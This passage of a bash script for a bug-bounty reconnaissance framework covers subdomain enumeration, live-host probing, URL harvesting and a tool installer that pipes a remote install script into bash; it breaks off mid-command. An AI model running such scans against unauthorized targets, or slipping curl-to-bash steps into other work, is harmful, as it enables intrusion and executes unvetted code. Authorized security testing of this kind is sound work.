#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════╗
#   BUG FRAMEWORK v5.1 — Recon · Detection · AUTO-EXPLOITATION Suite         ║
#   IDOR | BAC | OAuth | XSS | SQLi | SSRF | LFI | CMDi | CSRF | OWASP TOP 10║
#   AUTHORIZED & IN-SCOPE TARGETS ONLY — STRICTLY FOR BUG BOUNTY USE         ║
# ╚══════════════════════════════════════════════════════════════════════════╝

set -uo pipefail
IFS=$'\n\t'

# ── Portable-core shims (defensive; inert on Linux, fixes macOS) ──
head() { /usr/bin/head "$@"; }
if [[ "$(uname -s)" == "Darwin" ]]; then
    command -v ggrep    >/dev/null 2>&1 && grep()    { ggrep "$@"; }
    command -v gbase64  >/dev/null 2>&1 && base64()  { gbase64 "$@"; }
    command -v gtimeout >/dev/null 2>&1 && timeout() { gtimeout "$@"; }
    md5sum() { /sbin/md5 -q "$@" 2>/dev/null || md5 -q "$@"; }
    date() { case "$*" in *%N*) python3 -c 'import time; print(int(time.time()*1e9))' ;; *) /bin/date "$@" ;; esac; }
fi

readonly VERSION="5.1"
readonly TOOL_NAME="BUG FRAMEWORK"

# Colors
readonly RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m'
readonly CYAN='\033[0;36m' MAGENTA='\033[0;35m' WHITE='\033[1;37m' BOLD='\033[1m' DIM='\033[2m' NC='\033[0m'
readonly SYM_OK="${GREEN}[✔]${NC}" SYM_FAIL="${RED}[✖]${NC}" SYM_WARN="${YELLOW}[!]${NC}"
readonly SYM_INFO="${CYAN}[*]${NC}" SYM_HIT="${RED}[💥]${NC}" SYM_BUG="${MAGENTA}[🐛]${NC}"

# Globals
DOMAIN=""; WORKSPACE=""; LOG_MASTER=""; START_TIME=$(date +%s); SCAN_STEP=0; SCAN_TOTAL=26
T_HTTPX=50; T_NUCLEI=50; R_NUCLEI=150; T_FFUF=100; T_KATANA=50; D_KATANA=3; T_DALFOX=30
TIMEOUT_CONN=10; MAX_SUBS_WB=30
F_QUICK=false; F_DEEP=false; F_NO_EXPLOIT=false; F_RESUME=false; F_SILENT=false
F_BANNER=true; F_INSTALL=false; F_UPDATE_NUCLEI=false
M_SUB=false; M_ONE=false; M_URL=false; M_WE=false; M_JS=false; M_FUZZ=false; M_VULN=false
M_NUCLEI_ONLY=false; M_XSS=false; M_SQLI=false; M_SSRF=false; M_LFI=false; M_CSRF=false
M_CORS=false; M_IDOR=false; M_OAUTH=false; M_REPORT=false; M_SCOPE=false; M_WAF=false
M_API=false; M_PMF=false; M_PORTS=false; M_TECH=false; M_EXPLOIT=false
SCOPE_FILE=""; SESSION_COOKIE=""; PROXY_URL=""; CUSTOM_WL=""; CUSTOM_THREADS=""; CUSTOM_RATE=""
declare -a CUSTOM_HEADERS=()

print_banner() {
    [[ "$F_BANNER" == false ]] && return
    clear
    echo -e "${RED}"
    cat << 'BNREOF'
 ██████╗ ██╗   ██╗ ██████╗     ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
 ██╔══██╗██║   ██║██╔════╝     ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
 ██████╔╝██║   ██║██║  ███╗    █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║██████╔╝█████╔╝
 ██╔══██╗██║   ██║██║   ██║    ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║██╔══██╗██╔═██╗
 ██████╔╝╚██████╔╝╚██████╔╝    ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
 ╚═════╝  ╚═════╝  ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
BNREOF
    echo -e "${NC}"
    echo -e "  ${DIM}╔────────────────────────────────────────────────────────────────────────╗${NC}"
    echo -e "  ${DIM}│${NC}  ${BOLD}${WHITE}v${VERSION} ELITE · AUTO-EXPLOIT${NC}  ${CYAN}IDOR · BAC · OAuth · XSS · SQLi · SSRF · LFI · CMDi · CSRF${NC}"
    echo -e "  ${DIM}╚────────────────────────────────────────────────────────────────────────╝${NC}"
    echo -e "  ${RED}${BOLD}⚡  AUTHORIZED & IN-SCOPE TARGETS ONLY  ⚡${NC}"
    echo ""
}

show_help() {
    print_banner
    cat << 'HELPEOF'
FULL SCAN MODES
  bug -d <domain>                   Full aggressive recon + detection + AUTO-EXPLOITATION
  bug -d <domain> --quick           Fast scan (skip slow/heavy modules)
  bug -d <domain> --deep            Ultra aggressive (max threads + deep wordlists)
  bug -d <domain> --no-exploit      Recon + detection only (no active fuzzing)
  bug -d <domain> --resume          Resume a stopped scan from last checkpoint

RECON MODES
  bug -d <domain> -sub              Subdomain enumeration only
  bug -d <domain> -one              Single domain only (no subdomain enum)
  bug -d <domain> -url              URL collection only
  bug -d <domain> -we               URL + endpoint discovery (fast combo)
  bug -d <domain> -js               JavaScript analysis only
  bug -d <domain> -fuzz             Directory bruteforce + 403 bypass
  bug -d <domain> -ports            Port scan only (nmap)
  bug -scope <file>                 Scan multiple domains from file

DETECTION MODES
  bug -d <domain> -vuln             Full detection scan
  bug -d <domain> -exploit          AUTO-EXPLOIT confirmed findings (chain)
  bug -d <domain> -nuclei           Nuclei only
  bug -d <domain> -xss              XSS detection only (dalfox)
  bug -d <domain> -sqli             SQLi detection only (sqlmap)
  bug -d <domain> -ssrf             SSRF detection only
  bug -d <domain> -lfi              LFI detection only
  bug -d <domain> -csrf             CSRF + CORS detection
  bug -d <domain> -cors             CORS only
  bug -d <domain> -idor             IDOR + BAC classification
  bug -d <domain> -oauth            OAuth/Auth flow analysis
  bug -d <domain> -tech             Technology-specific checks
  bug -d <domain> -waf              WAF fingerprint + bypass profiling
  bug -d <domain> -api              API schema discovery (OpenAPI/GraphQL)
  bug -d <domain> -pmf              Parameter mutation fuzzing (SSTI/hidden/JSON)

REPORT
  bug -d <domain> -report           Regenerate HTML + MD report

OPTIONS (apply to any mode)
  --cookie <value>                  Session cookie (authenticated scans)
  --header <value>                  Custom header (repeatable)
  --proxy  <url>                    Route traffic through proxy (Burp etc)
  --wordlist <file>                 Custom wordlist for fuzzing
  --threads <n>                     Override thread count
  --rate    <n>                     Override requests per second
  --timeout <n>                     Override connection timeout
  --silent                          Suppress verbose, show findings only
  --no-banner                       Skip ASCII art banner

UTILITY
  bug --install                     Install all required tools (or ./setup.sh)
  bug --update-nuclei               Update nuclei templates only
  bug -h / --help                   Show this help
HELPEOF
    exit 0
}

parse_args() {
    [[ $# -eq 0 ]] && show_help
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -d) DOMAIN="$(echo ${2:-} | sed 's|https\?://||g' | sed 's|/$||g')"; shift ;;
            --quick) F_QUICK=true ;; --deep) F_DEEP=true ;; --no-exploit) F_NO_EXPLOIT=true ;;
            --resume) F_RESUME=true ;; --silent) F_SILENT=true ;; --no-banner) F_BANNER=false ;;
            --install) F_INSTALL=true ;; --update-nuclei) F_UPDATE_NUCLEI=true ;;
            --cookie) SESSION_COOKIE="${2:-}"; shift ;;
            --header) CUSTOM_HEADERS+=("${2:-}"); shift ;;
            --proxy) PROXY_URL="${2:-}"; shift ;;
            --wordlist) CUSTOM_WL="${2:-}"; shift ;;
            --threads) CUSTOM_THREADS="${2:-}"; shift ;;
            --rate) CUSTOM_RATE="${2:-}"; shift ;;
            --timeout) TIMEOUT_CONN="${2:-10}"; shift ;;
            -sub) M_SUB=true ;; -one) M_ONE=true ;; -url) M_URL=true ;; -we) M_WE=true ;;
            -js) M_JS=true ;; -fuzz) M_FUZZ=true ;; -ports) M_PORTS=true ;;
            -vuln) M_VULN=true ;; -exploit) M_EXPLOIT=true ;; -nuclei) M_NUCLEI_ONLY=true ;;
            -xss) M_XSS=true ;; -sqli) M_SQLI=true ;; -ssrf) M_SSRF=true ;; -lfi) M_LFI=true ;;
            -csrf) M_CSRF=true ;; -cors) M_CORS=true ;; -idor) M_IDOR=true ;;
            -oauth) M_OAUTH=true ;; -tech) M_TECH=true ;; -report) M_REPORT=true ;;
            -waf) M_WAF=true ;; -api) M_API=true ;; -pmf) M_PMF=true ;;
            -scope) SCOPE_FILE="${2:-}"; M_SCOPE=true; shift ;;
            -h|--help|-help) show_help ;;
            *) log_err "Unknown option: $1"; show_help ;;
        esac
        shift
    done
    if [[ "$F_DEEP" == true ]]; then
        T_HTTPX=100; T_NUCLEI=100; R_NUCLEI=300; T_FFUF=200; T_KATANA=100; D_KATANA=6; T_DALFOX=60; MAX_SUBS_WB=80
    fi
    [[ -n "$CUSTOM_THREADS" ]] && T_HTTPX="$CUSTOM_THREADS" T_NUCLEI="$CUSTOM_THREADS" T_FFUF="$CUSTOM_THREADS"
    [[ -n "$CUSTOM_RATE" ]] && R_NUCLEI="$CUSTOM_RATE"
}

log_info()  { [[ "$F_SILENT" == true ]] && return; echo -e "${SYM_INFO} ${DIM}[$(date '+%H:%M:%S')]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; }
log_ok()    { echo -e "${SYM_OK} ${GREEN}[$(date '+%H:%M:%S')]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; }
log_warn()  { echo -e "${SYM_WARN} ${YELLOW}[$(date '+%H:%M:%S')]${NC} ${BOLD}$*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; }
log_err()   { echo -e "${SYM_FAIL} ${RED}[$(date '+%H:%M:%S')]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; }

declare -A _HIT_SEEN=()
log_hit() {
    local key="$*"
    [[ -n "${_HIT_SEEN[$key]:-}" ]] && return
    _HIT_SEEN[$key]=1
    echo -e "${SYM_HIT} ${BOLD}${RED}[$(date '+%H:%M:%S')] ▶ FINDING: $*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}

uniq_add() {
    local file="$1"; shift
    mkdir -p "$(dirname "$file")" 2>/dev/null || true
    touch "$file" 2>/dev/null || true
    local line="$*"
    grep -qxF -- "$line" "$file" 2>/dev/null && return 1
    echo "$line" >> "$file"
    return 0
}

active_filter() {
    local in_file="$1" out_file="$2" max="${3:-30}"
    : > "$out_file"
    local n=0
    while IFS= read -r url && [[ $n -lt $max ]]; do
        [[ -z "$url" ]] && continue
        local code
        code=$(_curl --max-time 8 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
        case "$code" in
            200|201|202|204|301|302|307|308|401|404|405|500|501|502|503)
                echo "$url" >> "$out_file"; n=$((n+1)) ;;
        esac
    done < "$in_file"
    sort -u -o "$out_file" "$out_file" 2>/dev/null || true
}

dedupe_workspace() {
    log_info "Deduplicating all result files..."
    local n=0
    while IFS= read -r f; do
        sort -u -o "$f" "$f" 2>/dev/null && n=$((n+1)) || true
    done < <(find "$WORKSPACE" -name "*.txt" -type f 2>/dev/null)
    log_ok "Deduplicated $n files"
}

log_step()  { echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; echo -e "  ${BOLD}${MAGENTA}╔══════════════════════════════════════════════════════╗${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; echo -e "  ${BOLD}${MAGENTA}║  ${YELLOW}⚡${NC} ${BOLD}${WHITE}[$(date '+%H:%M:%S')] $*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; echo -e "  ${BOLD}${MAGENTA}╚══════════════════════════════════════════════════════╝${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; }
log_section() { echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; echo -e "  ${BOLD}${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; printf "  ${BOLD}${BLUE}│  ${YELLOW}%-60s${BLUE}│${NC}\n" "⚡  $1" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; echo -e "  ${BOLD}${BLUE}└──────────────────────────────────────────────────────────────┘${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"; }
progress()  {
    SCAN_STEP=$((SCAN_STEP + 1))
    local pct=$(( SCAN_STEP * 100 / SCAN_TOTAL ))
    [[ $pct -gt 100 ]] && pct=100
    local fill=$(( pct / 4 ))
    local bar=""
    for ((i=0;i<fill;i++)); do bar+="█"; done
    for ((i=fill;i<25;i++)); do bar+="░"; done
    echo -e "\n${CYAN}  ▸ [${bar}] ${pct}% — ${BOLD}$1${NC}\n" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}

has()       { command -v "$1" &>/dev/null; }
cnt()       { local f="${1:-/dev/null}"; [[ -f "$f" ]] && wc -l < "$f" 2>/dev/null || echo 0; }
safe_name() { echo "$1" | md5sum | cut -c1-12; }
pick_wl()   { local f; for f in "$@"; do [[ -f "$f" ]] && { echo "$f"; return 0; }; done; echo "${1:-}"; }

_curl() {
    local args=(-s --max-time "$TIMEOUT_CONN" --connect-timeout 5)
    [[ -n "$SESSION_COOKIE" ]] && args+=(-b "$SESSION_COOKIE")
    [[ -n "$PROXY_URL" ]] && args+=(-x "$PROXY_URL")
    for h in "${CUSTOM_HEADERS[@]:-}"; do [[ -n "$h" ]] && args+=(-H "$h"); done
    curl "${args[@]}" "$@"
}
_nuclei() {
    local args=()
    [[ -n "$SESSION_COOKIE" ]] && args+=(-H "Cookie: $SESSION_COOKIE")
    [[ -n "$PROXY_URL" ]] && args+=(-proxy "$PROXY_URL")
    for h in "${CUSTOM_HEADERS[@]:-}"; do [[ -n "$h" ]] && args+=(-H "$h"); done
    nuclei "${args[@]}" "$@"
}
_ffuf() {
    local args=()
    [[ -n "$SESSION_COOKIE" ]] && args+=(-b "$SESSION_COOKIE")
    [[ -n "$PROXY_URL" ]] && args+=(-x "$PROXY_URL")
    for h in "${CUSTOM_HEADERS[@]:-}"; do [[ -n "$h" ]] && args+=(-H "$h"); done
    ffuf "${args[@]}" "$@"
}

setup_workspace() {
    WORKSPACE="$HOME/bug-bounty/$(echo $DOMAIN | sed 's|https\?://||g' | sed 's|/$||g')"
    mkdir -p "$WORKSPACE"/{subdomains,urls/gf,js/downloaded,paths,endpoints,params,\
vulns/{xss,sqli,ssrf,lfi,csrf,cmdi,idor,nuclei,misconfig/graphql,param_fuzz},\
classified/{idor,bac,oauth,upload,export,payment,webhook,admin,debug,burp_imports},\
screenshots,reports,logs}
    LOG_MASTER="$WORKSPACE/logs/master.log"
    touch "$LOG_MASTER"
    cat > "$WORKSPACE/scan_config.txt" << EOF
TARGET=$DOMAIN
DATE=$(date)
VERSION=$VERSION
MODE=$(if [[ "$F_DEEP" == true ]]; then echo DEEP; elif [[ "$F_QUICK" == true ]]; then echo QUICK; else echo FULL; fi)
AUTH=$(if [[ -n "$SESSION_COOKIE" ]]; then echo AUTHENTICATED; else echo UNAUTHENTICATED; fi)
PROXY=${PROXY_URL:-NONE}
EOF
    echo ""
    echo -e "  ${BOLD}${WHITE}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "  ${BOLD}${WHITE}║  TARGET    : ${CYAN}${DOMAIN}${NC}"
    echo -e "  ${BOLD}${WHITE}║  WORKSPACE : ${DIM}${WORKSPACE}${NC}"
    echo -e "  ${BOLD}${WHITE}║  MODE      : ${YELLOW}$(if [[ "$F_DEEP" == true ]]; then echo "DEEP 🔥"; elif [[ "$F_QUICK" == true ]]; then echo "QUICK ⚡"; else echo "FULL 💀"; fi)${NC}"
    [[ -n "$SESSION_COOKIE" ]] && echo -e "  ${BOLD}${WHITE}║  AUTH      : ${GREEN}Authenticated (cookie set)${NC}"
    [[ -n "$PROXY_URL" ]] && echo -e "  ${BOLD}${WHITE}║  PROXY     : ${GREEN}${PROXY_URL}${NC}"
    echo -e "  ${BOLD}${WHITE}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
}

mark_done() { echo "$1" >> "$WORKSPACE/.done" 2>/dev/null || true; }
is_done()   { [[ "$F_RESUME" == true ]] && grep -q "^$1$" "$WORKSPACE/.done" 2>/dev/null; }
run_mod()   {
    local name="$1"; shift
    if is_done "$name"; then log_info "SKIP: $name (resumed)"; return 0; fi
    "$@"
    mark_done "$name"
}

ensure_live() {
    [[ -n "$WORKSPACE" ]] || setup_workspace
    [[ -s "$WORKSPACE/subdomains/live_urls.txt" ]] && return
    log_info "No live_urls.txt — running quick probe for $DOMAIN..."
    {
        echo "https://$DOMAIN"
        subfinder -d "$DOMAIN" -silent 2>/dev/null \
            | httpx -silent -threads "$T_HTTPX" -timeout "$TIMEOUT_CONN"
    } | sort -u > "$WORKSPACE/subdomains/live_urls.txt"
    touch "$WORKSPACE/subdomains/status_200.txt" \
          "$WORKSPACE/subdomains/status_403.txt" \
          "$WORKSPACE/subdomains/tech_stack.txt"
}

ensure_urls() {
    [[ -s "$WORKSPACE/urls/all_urls.txt" ]] && return
    ensure_live
    log_info "No URL data — quick collection for $DOMAIN..."
    {
        echo "$DOMAIN" | timeout 60 waybackurls 2>/dev/null
        echo "$DOMAIN" | timeout 60 gau --threads 5 2>/dev/null
    } | sort -u > "$WORKSPACE/urls/all_urls.txt"
    grep -E '\?[a-zA-Z0-9_]+=.' "$WORKSPACE/urls/all_urls.txt" | sort -u \
        > "$WORKSPACE/urls/urls_with_params.txt"
    for p in xss sqli ssrf lfi redirect idor; do
        gf "$p" "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | sort -u \
            > "$WORKSPACE/urls/gf/${p}.txt"
    done
    grep -oP 'https?://[^/]+\K(/[^?\s]*)?' "$WORKSPACE/urls/all_urls.txt" 2>/dev/null \
        | sort -u > "$WORKSPACE/endpoints/all_endpoints.txt"
    touch "$WORKSPACE/endpoints/interesting_paths.txt"
}

install_tools() {
    if [[ "$(uname -s)" == "Darwin" ]]; then
        echo -e "[!] macOS: install tools with the setup_bug.py helper (apt install is Linux-only)"
        exit 0
    fi
    log_step "INSTALLING ALL REQUIRED TOOLS"
    export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin"
    export GOPATH="$HOME/go"

    log_info "Updating apt..."
    sudo apt-get update -qq 2>/dev/null || true

    local APT_PKGS=(python3 python3-pip curl wget git jq nmap sqlmap openssl seclists)
    for pkg in "${APT_PKGS[@]}"; do
        has "$pkg" && { log_ok "$pkg ✓"; continue; }
        log_info "Installing $pkg..."
        sudo apt-get install -y -qq "$pkg" 2>/dev/null && log_ok "$pkg installed" || log_warn "$pkg failed"
    done

    if ! has go; then
        log_info "Installing Go 1.22..."
        wget -q "https://go.dev/dl/go1.22.0.linux-amd64.tar.gz" -O /tmp/go.tar.gz
        sudo tar -C /usr/local -xzf /tmp/go.tar.gz
        echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc
        export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin"
    fi

    local GO_PKGS=(
        "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
        "github.com/projectdiscovery/httpx/cmd/httpx@latest"
        "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        "github.com/projectdiscovery/katana/cmd/katana@latest"
        "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
        "github.com/projectdiscovery/alterx/cmd/alterx@latest"
        "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
        "github.com/tomnomnom/waybackurls@latest"
        "github.com/tomnomnom/gf@latest"
        "github.com/tomnomnom/anew@latest"
        "github.com/tomnomnom/qsreplace@latest"
        "github.com/lc/gau/v2/cmd/gau@latest"
        "github.com/hahwul/dalfox/v2@latest"
        "github.com/hakluke/hakrawler@latest"
        "github.com/ffuf/ffuf/v2@latest"
        "github.com/003random/getJS@latest"
        "github.com/owasp-amass/amass/v4/...@master"
        "github.com/tomnomnom/assetfinder@latest"
        "github.com/sensepost/gowitness@latest"
    )
    for pkg in "${GO_PKGS[@]}"; do
        local name; name=$(basename "${pkg%@*}")
        has "$name" && { log_ok "$name ✓"; continue; }
        log_info "Installing $name..."
        go install "$pkg" 2>/dev/null && log_ok "$name installed" || log_warn "$name failed"
    done

    local PIP_PKGS=(waymore uro arjun dirsearch wafw00f git-dumper)
    for pkg in "${PIP_PKGS[@]}"; do
        pip3 show "$pkg" &>/dev/null && { log_ok "$pkg ✓"; continue; }
        pip3 install -q "$pkg" --break-system-packages 2>/dev/null \
            && log_ok "$pkg installed" || log_warn "$pkg failed"
    done

    has feroxbuster || {
        curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh \
            | bash -s /usr/local/bin 2>/dev/null && log_ok "feroxbuster installed"
    }

    [[ ! -f "$HOME/tools/SecretFinder/SecretFinder.py" ]] && {
        mkdir -p "$HOME/tools"
        git clone -q https://github.com/m4ll0k/SecretFinder.git "$HOME/tools/SecretFinder" 2>/dev/null
        pip3 install -qr "$HOME/tools/SecretFinder/requirements.txt" --break-system-packages 2>/dev/null
        log_ok "SecretFinder installed"
    }
    [[ ! -f "$HOME/tools/LinkFinder/linkfinder.py" ]] && {
        git clone -q https://github.com/GerbenJavado/LinkFinder.git "$HOME/tools/LinkFinder" 2>/dev/null
        pip3 install -qr "$HOME/tools/LinkFinder/requirements.txt" --break-system-packages 2>/dev/null
        log_ok "LinkFinder installed"
    }
    [[ ! -f "$HOME/tools/jwt_tool/jwt_tool.py" ]] && {
        git clone -q https://github.com/ticarpi/jwt_tool.git "$HOME/tools/jwt_tool" 2>/dev/null
        pip3 install -qr "$HOME/tools/jwt_tool/requirements.txt" --break-system-packages 2>/dev/null
        log_ok "jwt_tool installed"
    }

    [[ ! -d "$HOME/.gf" ]] && {
        mkdir -p ~/.gf
        git clone -q https://github.com/1ndianl33t/Gf-Patterns.git /tmp/gfp 2>/dev/null
        cp /tmp/gfp/*.json ~/.gf/ 2>/dev/null || true
        git clone -q https://github.com/tomnomnom/gf.git /tmp/gfsrc 2>/dev/null
        cp /tmp/gfsrc/examples/*.json ~/.gf/ 2>/dev/null || true
        log_ok "GF patterns installed"
    }

    [[ ! -d "$HOME/nuclei-templates" ]] && nuclei -update-templates -silent 2>/dev/null \
        && log_ok "Nuclei templates downloaded"

    if [[ ! -f "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt" ]]; then
        log_info "Installing SecLists..."
        sudo apt-get install -y -qq seclists 2>/dev/null \
            || git clone -q --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists 2>/dev/null
        log_ok "SecLists installed"
    fi

    log_ok "All tools ready! Run: bug -d <domain>"
}

# ── MODULE 01 — SUBDOMAINS ──────────────────────────────────────────────
mod_subdomains() {
    progress "MODULE 01 — Subdomain Enumeration"
    log_section "MODULE 01 — SUBDOMAIN ENUMERATION"
    local O="$WORKSPACE/subdomains"
    log_info "subfinder (all sources, recursive)..."
    subfinder -d "$DOMAIN" -silent -all -recursive -o "$O/subfinder.txt" 2>/dev/null || true
    log_ok "subfinder: $(cnt "$O/subfinder.txt") subdomains"
    log_info "crt.sh certificate transparency..."
    _curl "https://crt.sh/?q=%25.${DOMAIN}&output=json" | jq -r '.[].name_value' 2>/dev/null \
        | sed 's/\*\.//g' | sort -u > "$O/crtsh.txt" || true
    log_ok "crt.sh: $(cnt "$O/crtsh.txt") subdomains"
    log_info "assetfinder..."
    assetfinder --subs-only "$DOMAIN" 2>/dev/null | sort -u > "$O/assetfinder.txt" || true
    log_info "urlscan.io..."
    _curl "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" \
        | jq -r '.results[]?.page?.domain' 2>/dev/null \
        | grep -F ".${DOMAIN}" | sort -u > "$O/urlscan_subs.txt" || true
    _curl "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" \
        | cut -d',' -f1 | sort -u > "$O/hackertarget.txt" 2>/dev/null || true
    _curl "https://rapiddns.io/subdomain/$DOMAIN?full=1" 2>/dev/null \
        | grep -oE "[a-zA-Z0-9._-]+\.${DOMAIN}" | sort -u > "$O/rapiddns.txt" || true
    _curl "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$DOMAIN" \
        | jq -r '.subdomains[]?' 2>/dev/null | sort -u > "$O/threatcrowd.txt" || true
    if [[ -n "${PDCP_API_KEY:-}" ]]; then
        chaos -d "$DOMAIN" -silent -key "$PDCP_API_KEY" 2>/dev/null | sort -u > "$O/chaos.txt" || true
        log_ok "chaos: $(cnt "$O/chaos.txt")"
    fi
    if [[ "$F_QUICK" == false ]]; then
        log_info "amass passive (2 min cap)..."
        mkdir -p "$O"
        timeout 120 amass enum -passive -d "$DOMAIN" -silent 2>/dev/null | sort -u > "$O/amass.txt" || true
        log_ok "amass: $(cnt "$O/amass.txt")"
        log_info "alterx permutation expansion..."
        cat "$O/subfinder.txt" 2>/dev/null | alterx -silent 2>/dev/null \
            | head -5000 | sort -u > "$O/alterx.txt" || true
        log_ok "alterx: $(cnt "$O/alterx.txt") candidates"
    fi
    cat "$O"/*.txt 2>/dev/null | sort -u \
        | grep -E "^[a-zA-Z0-9]([a-zA-Z0-9._-]*)\.${DOMAIN}$" > "$O/all_subdomains.txt" || true
    log_ok "Total unique subdomains: $(cnt "$O/all_subdomains.txt")"
    log_info "DNS resolution via dnsx..."
    cat "$O/all_subdomains.txt" | dnsx -silent -a -cname -resp -o "$O/resolved_full.txt" 2>/dev/null || true
    awk '{print $1}' "$O/resolved_full.txt" 2>/dev/null > "$O/resolved_domains.txt"
    sort -u -o "$O/resolved_domains.txt" "$O/resolved_domains.txt" 2>/dev/null || true
    log_ok "Resolved: $(cnt "$O/resolved_domains.txt") live subdomains"
    local wc_ip; wc_ip=$(dig "randomx99nomatch.$DOMAIN" A +short 2>/dev/null | head -1 || true)
    [[ -n "$wc_ip" ]] && log_warn "Wildcard DNS detected: $wc_ip — expect false positives"
    grep -iE "(github\.io|heroku|amazonaws|cloudfront|azurewebsites|netlify|surge\.sh|bitbucket\.io|fastly)" \
        "$O/resolved_full.txt" 2>/dev/null | sort -u > "$O/takeover_candidates.txt" || true
    [[ -s "$O/takeover_candidates.txt" ]] && log_warn "Potential takeover candidates: $(cnt "$O/takeover_candidates.txt")"
}

# ── MODULE 02 — LIVE PROBING ────────────────────────────────────────────
mod_httpx() {
    progress "MODULE 02 — Live Host Probing"
    log_section "MODULE 02 — LIVE HOST PROBING (httpx)"
    local O="$WORKSPACE/subdomains"
    if [[ "$M_ONE" == true ]]; then
        echo "https://$DOMAIN" > "$O/live_urls.txt"
        echo "https://$DOMAIN" > "$O/status_200.txt"
        touch "$O/status_403.txt" "$O/status_401.txt" "$O/tech_stack.txt"
        log_ok "-one mode: single target https://$DOMAIN"
        return
    fi
    log_info "httpx full fingerprint (threads: $T_HTTPX)..."
    {
        cat "$O/resolved_domains.txt" "$O/all_subdomains.txt" 2>/dev/null
        echo "$DOMAIN"
    } | sort -u | httpx -silent \
        -status-code -title -tech-detect \
        -content-length -web-server -ip -cname -cdn \
        -ports 80,443,8080,8443,8888,8000,3000,4000,5000,9000,9443 \
        -threads "$T_HTTPX" -timeout "$TIMEOUT_CONN" \
        -follow-redirects \
        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} \
        ${PROXY_URL:+-http-proxy "$PROXY_URL"} \
        -json -o "$O/live_hosts.json" 2>/dev/null || true
    jq -r '.url' "$O/live_hosts.json" 2>/dev/null | sort -u > "$O/live_urls.txt"
    log_ok "Live hosts: $(cnt "$O/live_urls.txt")"
    for code in 200 301 302 401 403 404 500; do
        jq -r "select(.status_code==$code) | .url" "$O/live_hosts.json" 2>/dev/null \
            | sort -u > "$O/status_${code}.txt" || true
    done
    log_ok "200:$(cnt "$O/status_200.txt") | 403:$(cnt "$O/status_403.txt") | 401:$(cnt "$O/status_401.txt") | 500:$(cnt "$O/status_500.txt")"
    cp "$O/status_403.txt" "$WORKSPACE/paths/403_targets.txt" 2>/dev/null || true
    jq -r '.tech[]?' "$O/live_hosts.json" 2>/dev/null \
        | sort | uniq -c | sort -rn | head -40 > "$O/tech_stack.txt"
    log_ok "Tech stack fingerprinted: $(cnt "$O/tech_stack.txt") entries"
}

# ── MODULE 03 — URL COLLECTION ──────────────────────────────────────────
mod_urls() {
    progress "MODULE 03 — URL Collection"
    log_section "MODULE 03 — URL COLLECTION (ALL SOURCES)"
    local O="$WORKSPACE/urls"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
    log_info "waybackurls (main + top ${MAX_SUBS_WB} subs)..."
    timeout 120 bash -c "echo '$DOMAIN' | waybackurls 2>/dev/null" | sort -u > "$O/wayback.txt" || true
    head -"$MAX_SUBS_WB" "$WORKSPACE/subdomains/resolved_domains.txt" 2>/dev/null \
        | while read -r sub; do
            timeout 25 bash -c "echo '$sub' | waybackurls 2>/dev/null" 2>/dev/null || true
          done | sort -u >> "$O/wayback.txt" || true
    sort -u -o "$O/wayback.txt" "$O/wayback.txt"
    log_ok "wayback: $(cnt "$O/wayback.txt") URLs"
    log_info "gau (AlienVault + URLScan + Wayback)..."
    timeout 180 gau --subs --threads 10 --timeout 10 \
        --blacklist "png,jpg,gif,ico,svg,woff,woff2,ttf,eot,css,mp4,zip" \
        "$DOMAIN" 2>/dev/null | sort -u > "$O/gau.txt" || true
    log_ok "gau: $(cnt "$O/gau.txt") URLs"
    log_info "waymore (180s cap)..."
    timeout 180 waymore -i "$DOMAIN" -mode U -oU "$O/waymore.txt" --timeout 30 2>/dev/null \
